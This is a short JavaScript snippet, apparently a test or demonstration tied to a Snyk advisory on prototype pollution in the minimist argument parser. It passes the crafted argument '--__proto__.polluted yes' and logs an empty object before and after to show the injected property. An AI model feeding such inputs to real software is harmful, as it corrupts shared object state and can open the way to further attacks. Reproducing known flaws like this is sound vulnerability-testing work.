// //https://snyk.io/vuln/SNYK-JS-MINIMIST-559764
// test("prototype pollution in minimist", () => {
console.log({}.polluted);

  require("minimist")("--__proto__.polluted yes".split(" "));

console.log({}.polluted);
// });
